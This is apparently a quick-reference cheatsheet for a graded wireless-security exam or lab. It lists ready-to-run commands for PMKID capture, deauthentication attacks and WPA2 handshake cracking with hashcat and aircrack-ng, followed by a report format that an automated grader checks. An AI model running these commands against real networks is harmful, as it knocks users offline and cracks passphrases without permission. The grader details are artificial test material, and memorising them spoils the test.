# Cheatsheet — exam quick reference

## Map first

```bash
sudo airodump-ng wlan1
# mgmt-wifi ch6 WPA2 | exec-wifi ch11 WPA2 + client
```

## Two paths, pick per target

```bash
# PMKID (clientless) — works while interface is managed
sudo hcxdumptool -i wlan1 -o mgmt.pcapng --enable_status=15
hcxpcapngtool -o mgmt.22000 mgmt.pcapng
hashcat -m 22000 mgmt.22000 /opt/wifi/wordlist.txt

# Deauth+handshake — monitor mode needed
sudo airmon-ng start wlan1
sudo airodump-ng -c 11 --bssid <AP> -w exec wlan1mon
sudo aireplay-ng -0 3 -a <AP> -c <CLIENT> wlan1mon
aircrack-ng -w /opt/wifi/wordlist.txt exec-01.cap
```

## Interface conflicts

One radio = one job. hcxdumptool and airodump can't share wlan1 at the
same time — serialize: PMKID first (it's instant), then monitor mode.

## Report format (grader greps both keys)

```bash
cat > /home/wifi/exam-report.txt <<'EOF'
mgmt-wifi: <psk1>
exec-wifi: <psk2>
EOF
```
